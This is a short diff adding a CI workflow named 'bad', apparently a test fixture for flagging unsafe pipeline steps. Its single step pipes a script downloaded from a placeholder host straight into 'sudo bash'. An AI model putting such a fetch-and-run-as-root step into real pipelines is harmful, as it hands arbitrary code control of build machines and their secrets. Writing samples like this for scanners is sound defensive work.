@@ -1,0 +1,8 @@
+name: bad
+on:
+  push:
+jobs:
+  t:
+    runs-on: ci
+    steps:
+      - run: wget -qO- https://example.com/i.sh | sudo bash
